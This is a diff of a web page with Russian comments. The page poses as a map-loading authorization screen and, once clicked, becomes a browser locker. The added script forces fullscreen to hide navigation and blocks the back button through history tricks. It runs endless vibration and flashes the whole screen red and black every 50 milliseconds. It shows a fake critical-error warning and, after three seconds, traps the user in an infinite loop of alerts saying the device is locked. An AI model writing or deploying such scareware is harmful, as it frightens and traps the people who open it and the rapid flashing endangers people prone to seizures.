@@ -1,39 +1,35 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LOADING...</title>
-</head>
-<body style="background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: monospace;">
-
-    <div id="box" style="border: 2px solid #0f0; padding: 40px; text-align: center; cursor: pointer;">
-        <h1 id="status">ЗАГРУЗКА КАРТЫ...</h1>
-        <p>[ Нажмите для авторизации ]</p>
-    </div>
-
-    <script>
         const box = document.getElementById('box');
         const status = document.getElementById('status');
         const body = document.body;
 
         box.onclick = function() {
-            // 1. ЖЕСТКАЯ ВИБРАЦИЯ (чередуем мощные удары)
+            // 1. Уходим в Fullscreen (прячем кнопки навигации)
+            if (body.requestFullscreen) { body.requestFullscreen(); } 
+            else if (body.webkitRequestFullscreen) { body.webkitRequestFullscreen(); }
+
+            // 2. Блокируем кнопку "Назад" (забиваем историю)
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.go(1);
+            };
+
+            // 3. Бесконечная вибрация
             if (navigator.vibrate) {
                 setInterval(() => {
-                    navigator.vibrate([400, 100, 400, 100, 800]);
-                }, 1000);
+                    navigator.vibrate([500, 100, 500, 100, 1000]);
+                }, 1200);
             }
 
-            // 2. ВИЗУАЛЬНЫЙ ТРЭШ (мигание всем экраном)
-            status.innerHTML = "SYSTEM EXPLOIT:<br>MEM_CORRUPT<br>RAID_INIT...";
-            status.style.color = "#ff0000";
-            box.style.borderColor = "#ff0000";
-
+            // 4. Визуальный хаос
+            status.innerHTML = "SYSTEM CRITICAL ERROR<br>RAID_OVERRIDE_ENABLED<br>DO NOT CLOSE";
             setInterval(() => {
                 body.style.background = (body.style.background === 'rgb(255, 0, 0)') ? '#000' : '#f00';
-            }, 50); // Частота мигания - 50мс (очень быстро)
+            }, 50);
+
+            // 5. "Капкан" из алертов (вылезут через 3 секунды после начала)
+            setTimeout(() => {
+                while(true) {
+                    alert("КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ! УСТРОЙСТВО ЗАБЛОКИРОВАНО.");
+                }
+            }, 3000);
         };
-    </script>
-</body>
-</html>
